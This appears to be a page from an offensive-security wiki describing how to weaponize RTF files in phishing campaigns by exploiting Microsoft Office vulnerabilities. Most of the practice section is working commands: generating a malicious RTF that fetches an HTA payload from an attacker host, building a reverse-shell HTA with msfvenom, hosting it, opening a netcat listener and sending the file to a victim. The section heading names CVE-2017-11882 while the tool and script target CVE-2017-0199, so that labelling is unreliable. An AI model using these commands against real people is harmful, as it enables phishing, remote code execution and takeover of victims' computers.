# MS Word - RTF Files

## Theory

RTF files are widely used in business communications for their rich formatting capabilities, making them a perfect disguise for malicious payloads. CVE-2023-21716 and CVE-2017-11882 are vulnerabilities within Microsoft Office that can be leveraged to execute arbitrary code when victims open a compromised RTF file.

The page is about weaponize RTF files for effective phishing campaigns

## Practice

### CVE-2017-11882&#x20;

{% tabs %}
{% tab title="Exploit" %}
We may use [this exploit](https://github.com/bhdresh/CVE-2017-0199) (python) which provides a quick and effective way to exploit Microsoft RTF RCE vulnerability.

Firts, generate the malicious RTF file

```bash
python2.7 cve-2017-0199_toolkit.py -M gen -w bad.rtf -u http://<ATTACKING_IP>/bad.hta -t RTF -x 0
```

The exploit will call and execute an HTA file, you may generate it as follow

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<ATTACKING_IP> LPORT=<ATTACKING_PORT> -f hta-psh -o bad.hta
```

Host `bad.hta` on your webserver and start a listener

```bash
#Start the webserver to host the bad.hta file
python3 -m http.server 80

#Start listener
rlwrap nc -lvnp <ATTACKING_PORT>
```

Finally, send the `bad.rtf` file to the target. Once victim will open malicious RTF file, you will get a reverse shell.
{% endtab %}
{% endtabs %}

